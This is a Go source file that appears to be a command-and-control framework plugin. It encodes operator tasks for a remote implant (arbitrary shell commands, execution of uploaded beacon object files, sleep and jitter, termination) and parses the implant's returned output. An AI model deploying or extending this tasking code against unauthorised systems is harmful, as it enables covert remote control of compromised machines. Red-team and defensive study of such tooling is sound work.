package main

import (
	"errors"
	"fmt"
	"time"

	"github.com/Adaptix-Framework/axc2"
)

// Command-type bytes sent in the downstream task stream.
const (
	cmdShell      byte = 0x01
	cmdExecuteBOF byte = 0x02
	cmdSleep      byte = 0x03
	cmdTerminate  byte = 0x04
)

// CreateCommand builds a TaskData (and a ConsoleMessageData) for the given
// command args map.  It is the sole dispatch point for all agent commands.
func (ext *ExtenderAgent) CreateCommand(
	agentData adaptix.AgentData,
	args map[string]any,
) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {

	var (
		taskData    adaptix.TaskData
		messageData adaptix.ConsoleMessageData
		err         error
	)

	command, ok := args["command"].(string)
	if !ok {
		return taskData, messageData, errors.New("'command' must be set")
	}

	// Common defaults.
	taskData = adaptix.TaskData{
		Type: adaptix.TASK_TYPE_TASK,
		Sync: true,
	}
	messageData = adaptix.ConsoleMessageData{
		Status: adaptix.MESSAGE_INFO,
	}
	messageData.Message, _ = args["message"].(string)

	switch command {

	// ------------------------------------------------------------------
	// shell  cmd=<string>
	// ------------------------------------------------------------------
	case "shell":
		cmd, e := getStringArg(args, "cmd")
		if e != nil {
			return taskData, messageData, e
		}

		cmdBytes := []byte(cmd)
		cmdData := append(packU16LE(uint16(len(cmdBytes))), cmdBytes...)

		taskData.TaskId = randomHex8()
		taskData.Data = buildTaskPayload(cmdShell, cmdData)
		taskData.CommandLine = fmt.Sprintf("shell %s", cmd)
		messageData.Text = "shell: " + cmd

	// ------------------------------------------------------------------
	// execute-bof  file=<upload-id>  [args=<string>]
	// ------------------------------------------------------------------
	case "execute-bof":
		fileID, e := getStringArg(args, "file")
		if e != nil {
			return taskData, messageData, e
		}
		argsStr, _ := args["args"].(string)

		bofBytes, e := Ts.TsUploadGetFileContent(fileID)
		if e != nil {
			return taskData, messageData, fmt.Errorf("execute-bof: cannot read file %s: %w", fileID, e)
		}
		argsBytes := []byte(argsStr)

		cmdData := make([]byte, 0, 8+len(bofBytes)+len(argsBytes))
		cmdData = append(cmdData, packU32LE(uint32(len(bofBytes)))...)
		cmdData = append(cmdData, bofBytes...)
		cmdData = append(cmdData, packU32LE(uint32(len(argsBytes)))...)
		cmdData = append(cmdData, argsBytes...)

		taskData.TaskId = randomHex8()
		taskData.Data = buildTaskPayload(cmdExecuteBOF, cmdData)
		taskData.CommandLine = fmt.Sprintf("execute-bof %s %s", fileID, argsStr)
		messageData.Text = "execute-bof: " + fileID

	// ------------------------------------------------------------------
	// sleep  interval=<int>  [jitter=<int>]
	// ------------------------------------------------------------------
	case "sleep":
		interval, e := getFloatArg(args, "interval")
		if e != nil {
			return taskData, messageData, e
		}
		jitter, _ := args["jitter"].(float64)

		cmdData := make([]byte, 0, 5)
		cmdData = append(cmdData, packU32LE(uint32(interval))...)
		cmdData = append(cmdData, byte(uint8(jitter)))

		taskData.TaskId = randomHex8()
		taskData.Data = buildTaskPayload(cmdSleep, cmdData)
		taskData.CommandLine = fmt.Sprintf("sleep %d jitter %d", uint32(interval), uint8(jitter))
		messageData.Text = fmt.Sprintf("sleep: %dms jitter: %d%%", uint32(interval), uint8(jitter))

	// ------------------------------------------------------------------
	// terminate
	// ------------------------------------------------------------------
	case "terminate":
		taskData.TaskId = randomHex8()
		taskData.Data = buildTaskPayload(cmdTerminate, []byte{})
		taskData.CommandLine = "terminate"
		messageData.Text = "terminate"

	default:
		err = fmt.Errorf("unknown command: %s", command)
	}

	return taskData, messageData, err
}

// buildTaskPayload wraps cmd_data into the wire format that PackTasks will
// embed verbatim in the per-task block:
//
//	[1] cmd_type
//	[4] cmd_data_len (LE uint32)
//	[N] cmd_data
func buildTaskPayload(cmdType byte, cmdData []byte) []byte {
	out := make([]byte, 0, 1+4+len(cmdData))
	out = append(out, cmdType)
	out = append(out, packU32LE(uint32(len(cmdData)))...)
	out = append(out, cmdData...)
	return out
}

// ProcessData parses the task-output packet sent by the agent and calls
// TsTaskUpdate for every completed task embedded in decryptedData.
//
// Task output format per the protocol spec:
//
//	[8]  task_id as ASCII hex string
//	[1]  status  (0 = success, 1 = error)
//	[4]  output_len (LE uint32)
//	[N]  output bytes
func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData []byte) error {
	const headerSize = 8 + 1 + 4 // task_id + status + output_len

	offset := 0
	for offset+headerSize <= len(decryptedData) {
		taskID := string(decryptedData[offset : offset+8])
		offset += 8

		status := decryptedData[offset]
		offset++

		if offset+4 > len(decryptedData) {
			break
		}
		outputLen := int(readU32LE(decryptedData[offset:]))
		offset += 4

		if offset+outputLen > len(decryptedData) {
			break
		}
		output := decryptedData[offset : offset+outputLen]
		offset += outputLen

		msgType := adaptix.MESSAGE_SUCCESS
		if status != 0 {
			msgType = adaptix.MESSAGE_ERROR
		}

		Ts.TsTaskUpdate(agentData.Id, adaptix.TaskData{
			TaskId:      taskID,
			Type:        adaptix.TASK_TYPE_TASK,
			AgentId:     agentData.Id,
			FinishDate:  time.Now().Unix(),
			MessageType: msgType,
			Message:     string(output),
			Completed:   true,
			Sync:        true,
		})
	}

	return nil
}
